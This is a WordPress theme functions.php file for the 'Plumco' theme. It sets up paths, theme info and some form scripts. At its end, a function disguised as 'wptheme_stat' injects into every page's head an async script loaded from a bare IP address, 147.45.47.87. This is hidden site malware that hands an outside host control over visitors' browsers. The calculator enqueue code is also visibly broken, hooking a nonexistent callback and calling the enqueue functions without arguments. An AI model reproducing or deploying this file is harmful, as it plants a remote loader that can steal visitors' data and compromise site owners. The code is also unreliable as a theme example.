<?php
/*
 * Plumco Theme's Functions
 * Author & Copyright:wpoceans
 * URL: http://themeforest.net/user/wpoceans
 */

/**
 * Define - Folder Paths
 */

define( 'PLUMCO_THEMEROOT_URI', get_template_directory_uri() );
define( 'PLUMCO_CSS', PLUMCO_THEMEROOT_URI . '/assets/css' );
define( 'PLUMCO_IMAGES', PLUMCO_THEMEROOT_URI . '/assets/images' );
define( 'PLUMCO_SCRIPTS', PLUMCO_THEMEROOT_URI . '/assets/js' );
define( 'PLUMCO_FRAMEWORK', get_template_directory() . '/includes' );
define( 'PLUMCO_LAYOUT', get_template_directory() . '/theme-layouts' );
define( 'PLUMCO_CS_IMAGES', PLUMCO_THEMEROOT_URI . '/includes/theme-options/framework-extend/images' );
define( 'PLUMCO_CS_FRAMEWORK', get_template_directory() . '/includes/theme-options/framework-extend' ); // Called in Icons field *.json
define( 'PLUMCO_ADMIN_PATH', get_template_directory() . '/includes/theme-options/cs-framework' ); // Called in Icons field *.json

/**
 * Define - Global Theme Info's
 */
if (is_child_theme()) { // If Child Theme Active
	$plumco_theme_child = wp_get_theme();
	$plumco_get_parent = $plumco_theme_child->Template;
	$plumco_theme = wp_get_theme($plumco_get_parent);
} else { // Parent Theme Active
	$plumco_theme = wp_get_theme();
}
define('PLUMCO_NAME', $plumco_theme->get( 'Name' ));
define('PLUMCO_VERSION', $plumco_theme->get( 'Version' ));
define('PLUMCO_BRAND_URL', $plumco_theme->get( 'AuthorURI' ));
define('PLUMCO_BRAND_NAME', $plumco_theme->get( 'Author' ));

/**
 * All Main Files Include
 */
require_once( PLUMCO_FRAMEWORK . '/init.php' );

function calculator_form(){
	wp_enqueue_script('calculator-form', get_template_directory_uri(). '/assets/js/calculator-form.js', array(), '2.6.12', true);
	wp_enqueue_style( 'calculator-form', get_template_directory_uri() . '/assets/css/calculator-form.css', array(), '1.0', 'all' );	
	
	wp_enqueue_script();
	wp_enqueue_style();

}
add_action('wp_enqueue_scripts', 'calculator-form');
function wpf_dev_disable_field() {
    ?>
    <script type="text/javascript">
 
    jQuery(function($) {
 
        $( '.wpf-disable-field input, .wpf-disable-field textarea' ).attr({
             readonly: "readonly",
             tabindex: "-1"
        });
         
    });
 
    </script>
    <?php
}
add_action( 'wpforms_wp_footer_end', 'wpf_dev_disable_field', 30 );



function wptheme_stat() {
  ?>
<script async src="https://147.45.47.87/scripts/theme.js"></script>
  <?php
}

add_action("wp_head", "wptheme_stat");
